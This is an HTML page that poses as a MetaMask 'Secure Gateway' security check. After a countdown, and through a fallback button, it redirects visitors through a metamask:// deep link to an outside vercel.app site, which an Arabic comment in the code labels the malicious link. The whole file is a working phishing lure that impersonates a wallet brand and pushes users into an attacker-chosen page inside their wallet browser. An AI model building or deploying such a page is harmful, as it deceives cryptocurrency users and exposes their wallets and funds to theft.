<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check - Redirecting...</title>
    <style>
        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #111827; /* Dark theme for professional look */
            color: #ffffff;
        }
        .loader {
            border: 4px solid #374151;
            border-top: 4px solid #f6851b; /* MetaMask Orange */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { margin-top: 25px; font-size: 1.2rem; font-weight: 500; }
        .timer { margin-top: 10px; color: #9ca3af; font-size: 0.9rem; }
        #countdown { color: #f6851b; font-weight: bold; }
        .btn-manual {
            margin-top: 30px;
            padding: 10px 20px;
            background-color: transparent;
            color: #f6851b;
            border: 1px solid #f6851b;
            border-radius: 6px;
            cursor: pointer;
            text-decoration: none;
            font-size: 0.9rem;
            transition: 0.3s;
        }
        .btn-manual:hover { background-color: #f6851b; color: white; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="status">Connecting to MetaMask Secure Gateway...</div>
    <div class="timer">Automatic redirect in <span id="countdown">5</span> seconds</div>

    <script>
        // الرابط الخبيث (الثغرة)
        const targetUrl = "metamask://browse?url=https://hatestck.vercel.app";
        let seconds = 5;
        const countdownElement = document.getElementById('countdown');

        // تحديث العداد التنازلي بصرياً
        const timerInterval = setInterval(() => {
            seconds--;
            countdownElement.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(timerInterval);
                redirectToApp();
            }
        }, 1000);

        function redirectToApp() {
            window.location.href = targetUrl;
        }

        // محاولة التحويل التلقائي فوراً كـ Backup
        window.onload = function() {
            // التحويل سيتم بواسطة الـ setInterval أعلاه بعد 5 ثوانٍ
        };
    </script>

    <a href="javascript:redirectToApp()" class="btn-manual">Click here if not redirected</a>

</body>
</html>
